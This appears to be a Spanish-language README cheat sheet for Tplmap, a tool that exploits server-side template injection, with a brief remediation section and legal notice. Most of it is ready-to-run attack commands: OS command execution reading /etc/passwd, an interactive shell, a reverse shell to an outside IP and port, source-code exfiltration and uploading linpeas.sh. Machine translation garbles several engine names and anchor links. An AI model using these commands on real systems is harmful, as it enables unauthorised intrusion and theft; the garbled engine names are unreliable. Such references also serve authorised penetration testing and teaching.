<!-- language-home-navigation -->
[🏠 Página Principal Española](../../README.es.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇫🇷 Français](README.fr.md) • [🇮🇹 Italiano](README.it.md)

[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🎭 Tplmap - Hoja de referencia completa

[🇹🇷 Türkçe Sürüm](traducciones/README.tr.md)
```
  ████████╗██████╗ ██╗     ███╗   ███╗ █████╗ ██████╗ 
  ╚══██╔══╝██╔══██╗██║     ████╗ ████║██╔══██╗██╔══██╗
     ██║   ██████╔╝██║     ██╔████╔██║███████║██████╔╝
     ██║   ██╔═══╝ ██║     ██║╚██╔╝██║██╔══██║██╔═══╝ 
     ██║   ██║     ███████╗██║ ╚═╝ ██║██║  ██║██║     
     ╚═╝   ╚═╝     ╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝     
       Server-Side Template Injection (SSTI) Automated Exploiter
```
<p align="centro">
  <img src="https://img.shields.io/badge/Tplmap-SSTI_Exploitation-blue?style=for-the-badge" alt="Tplmap">
  <img src="https://img.shields.io/badge/Category-Web_Security_&_API-orange?style=for-the-badge" alt="Seguridad web y API">
  <img src="https://img.shields.io/badge/Engines-Jinja2_Twig_Mako_Freemarker-green?style=for-the-badge" alt="Motores de plantilla">
  <img src="https://img.shields.io/badge/License-GPLv2-red?style=for-the-badge" alt="Licencia GPLv2">
</p>

<p align="centro">
  <b>🌐 Herramienta de explotación automatizada diseñada para detectar y explotar vulnerabilidades de inyección de plantillas del lado del servidor (SSTI) para lograr la ejecución remota de código</b>
</p>

---

## 📋 Tabla de contenidos

- [Descripción general y vulnerabilidad SSTI] (#-descripción general--la-vulnerabilidad-ssti)
- [Motores de plantillas compatibles](#-motores-de-plantillas-compatibles)
- [Instalación](#-instalación)
- [Detección de vulnerabilidad básica](#-detección-de-vulnerabilidad-básica)
- [Apuntar a puntos de inyección específicos (marcador `*`)](#-apuntar a puntos de inyección específicos--marcador)
- [Ejecución de comando remoto (`--os-cmd`)](#-ejecución-de-comando-remoto---os-cmd)
- [Shells interactivos y conexiones inversas](#-shells-interactivos--conexiones-inversas)
- [Carga y descarga de archivos] (#-carga-archivo--descarga)
- [Prueba de datos y encabezados POST] (#-testing-post-data--headers)
- [Tabla de referencia rápida](#-tabla-de-referencia-rápida)
- [Consideraciones defensivas y remediación](#-consideraciones-defensivas--remediación)
- [Aviso legal](#-aviso-legal)

---

## 🎯 Descripción general y vulnerabilidad SSTI

La **Inyección de plantilla del lado del servidor (SSTI)** ocurre cuando una aplicación incorpora entradas de usuario no validadas directamente en una plantilla del lado del servidor en lugar de pasarlas como datos para ser representados. Debido a que los motores de plantillas modernos permiten sintaxis como `{{7*7}}` o `${7*7}`, los atacantes pueden salir del entorno limitado y acceder al entorno de ejecución subyacente (Python, Java, PHP, Ruby, Node.js).

Escrito por **Miroslav Stampar** y **Emilio Pinna**, **Tplmap** actúa como "SQLMap para motores de plantillas". Automáticamente toma huellas digitales del motor de plantilla activo, sale de los contextos de evaluación de la plantilla y escala la ejecución del código al acceso completo al shell a nivel del sistema operativo.

---

## 🧩 Motores de plantillas compatibles

| Idioma | Motores de plantillas compatibles |
|----------|----------------------|
| **Python** | Jinja2, Mako, Tornado, Nunjucks |
| **PHP** | Ramita, sabelotodo |
| **Java** | Marcador libre, Velocidad |
| **Rubí** | ERB, delgado |
| **Nodo.js** | Jade, Pug, Dust.js |

---

## 📥 Instalación

Tplmap está construido en Python:
```bash
# Clone GitHub repository
git clone https://github.com/epinna/tplmap.git
cd tplmap

# Install dependencies
pip install -r requirements.txt

# Verify installation
python tplmap.py --help
```
---

## 🚀 Detección básica de vulnerabilidades
```bash
# Scan a GET parameter for SSTI
python tplmap.py -u "http://target.local/page?name=John"

# Mark explicit injection point using an asterisk (*)
python tplmap.py -u "http://target.local/profile?id=1&bio=*"
```
---

## 💻 Ejecución remota de comandos (`--os-cmd`)

Una vez que Tplmap detecta el motor (por ejemplo, Jinja2), ejecute comandos de shell arbitrarios directamente:
```bash
# Execute whoami on target
python tplmap.py -u "http://target.local/page?name=*" --os-cmd "whoami; id"

# Read sensitive configuration files
python tplmap.py -u "http://target.local/page?name=*" --os-cmd "cat /etc/passwd"
```
---

## 💀 Conchas interactivas y conexiones inversas
```bash
# Spawn an interactive pseudo-terminal within Tplmap
python tplmap.py -u "http://target.local/page?name=*" --os-shell

# Drop a full reverse TCP connection to a Netcat listener
python tplmap.py -u "http://target.local/page?name=*" \
  --reverse-shell 10.10.14.5 4444
```
---

## 📁 Carga y descarga de archivos

Exfiltre el código fuente o cargue herramientas de persistencia:
```bash
# Download remote source code or configuration
python tplmap.py -u "http://target.local/page?name=*" \
  --download /var/www/html/app.py ./app_loot.py

# Upload a local payload to remote /tmp/ directory
python tplmap.py -u "http://target.local/page?name=*" \
  --upload ./linpeas.sh /tmp/linpeas.sh
```
---

## 🌐 Prueba de datos y encabezados POST
```bash
# Test POST body parameters
python tplmap.py -u "http://target.local/comment" -d "author=test&comment=*"

# Test HTTP Headers
python tplmap.py -u "http://target.local/dashboard" -H "User-Agent: *"

# Test behind authenticated session cookies
python tplmap.py -u "http://target.local/welcome?user=*" -c "session=xyz123"
```
---

## ⚡ Tabla de referencia rápida

| Objetivo | Comando |
|-----------|------------------|
| **Detectar SSTI en URL** | `python tplmap.py -u "<URL>?param=*"` |
| **Ejecutar comando remoto** | `python tplmap.py -u "<URL>" --os-cmd="<CMD>"` |
| **Terminal interactiva** | `python tplmap.py -u "<URL>" --os-shell` |
| **Soltar carcasa inversa** | `python tplmap.py -u "<URL>" --reverse-shell <IP> <PORT>` |
| **Descargar archivo remoto** | `python tplmap.py -u "<URL>" --download <REMOTE> <LOCAL>` |
| **Subir archivo local** | `python tplmap.py -u "<URL>" --upload <LOCAL> <REMOTE>` |
| **Cuerpo de la publicación de prueba** | `python tplmap.py -u "<URL>" -d "data=*"` |

---

## 🛡️ Consideraciones defensivas y remediación

1. **Escapado según el contexto:** Nunca concatene entradas sin formato del usuario en cadenas de plantilla. Utilice el mecanismo de enlace de variables nativo del motor de plantillas (por ejemplo, en Jinja2: `render_template('hello.html', name=user_input)` en lugar de `render_template_string(f"Hello {user_input}")`).
2. **Restricciones de la zona de pruebas:** Aplique una zona de pruebas estricta dentro de los motores donde la representación dinámica es inevitable, no permitiendo el acceso a `__class__`, `__mro__` u objetos de reflexión.

---

## ⚠️ Aviso legal

> [!PRECAUCIÓN]
> Tplmap ejecuta código remoto arbitrario en los servidores de aplicaciones de destino. Probar o explotar aplicaciones web sin autorización previa por escrito es estrictamente ilegal.